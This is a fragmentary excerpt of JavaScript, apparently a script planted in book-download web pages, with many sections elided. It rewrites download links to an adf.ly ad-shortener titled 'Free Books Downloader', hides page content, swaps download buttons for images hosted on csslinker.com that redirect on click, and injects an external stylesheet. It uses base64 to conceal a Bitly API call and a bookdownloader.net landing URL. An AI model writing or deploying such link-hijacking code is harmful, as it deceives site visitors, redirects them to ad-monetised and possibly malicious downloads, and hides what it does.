 ...
 var download = document.getElementById('download')
  if(download != null){
    ...
    for (i = 0; i < download.length; i++) {
 	download[i].appendChild(btn);
    	download[i].appendChild(br);
    }
  }
}
...
function menuchanger(){
  ...
  if(downloadmenu.length != 0) {
    for (i = 0; i < downloadmenu.length; i++) {
      downloadmenu[i].href="http://adf.ly/1VcOnJ";
      downloadmenu[i].innerHTML = 'Free Books Downloader';
    }
  }
  
  var description = document.getElementsByClassName('descriptionwrapper');	
  if(description.length != 0){
	description[0].setAttribute('style','display:none');
  }
  /*	
...
function url_changer(shorterurl) {
  ...
  if(dloadimage != null){                      
    dloadimage.src="http://csslinker.com/download.jpg";
  }
  ...
  if(loader != null){  
    ...
    for (i = 0; i < loader.length; i++) {
      loader[i].setAttribute('style','display:none');
    }
  }
  amountdownload();
}
...
var bitly = B64.decode("aHR0cHM6Ly9hcGktc3NsLmJpdGx5LmNvbS92My9zaG9ydGVuP2NhbGxiYWNrPT8=");
    $.getJSON(
        bitly,
        {
            "format": "json",
	...
	//url_changer(long_url);
	//clickable(long_url);
	/*bitly += "&login="+login+"&apiKey="+api_key+"&longUrl="+long_url+"&format=json";
	//alert(bitly);
	var request = $.ajax({
		dataType: "json",
		url: bitly,
		//data: {format:"json",apiKey:api_key,login:login,longUrl:long_url},
...
function clickable(shorterurl){
  ...
  if(dloadbuttonclickable != null){
    dloadbuttonclickable.innerHTML='<img src="http://csslinker.com/download.jpg" />';
    $('#dloadbuttonclickable').click(function(e) { 
      window.location.href = shorterurl;
    });
  }else{
    var dloadbuttonclickable = document.getElementsByClassName('dloadbuttonclickable');	
    for (i = 0; i < dloadbuttonclickable.length; i++) {
    	dloadbuttonclickable[i].innerHTML='<img src="http://csslinker.com/download.jpg" />';
    }
    $('.dloadbuttonclickable').click(function(e) { 
      window.location.href = shorterurl;
    });
  }
  var dloaddivclickable = document.getElementById('dloaddivclickable');
  if(dloaddivclickable != null){
    dloaddivclickable.innerHTML='<img src="http://csslinker.com/download.jpg" />';
    $('#dloaddivclickable').click(function(e) { 
      window.location.href = shorterurl;
    });
  }else{
    var dloaddivclickable = document.getElementsByClassName('dloaddivclickable');	
    for (i = 0; i < dloaddivclickable.length; i++) {
    	dloaddivclickable[i].innerHTML='<img src="http://csslinker.com/download.jpg" />';
    }
    $('.dloaddivclickable').click(function(e) { 
      window.location.href = shorterurl;
    });
...
function includecss(){
	$('head').append( $('<link rel="stylesheet" type="text/css" />').attr('href', 'http://csslinker.com/simplebook.css') );
}
...
var land = B64.decode("dXJsPXd3dy5ib29rZG93bmxvYWRlci5uZXQmcmVmZXJlcj13d3cuYm9va2Rvd25sb2FkZXIubmV0L2xhbmRpbmcucGhwJmtleT0=");
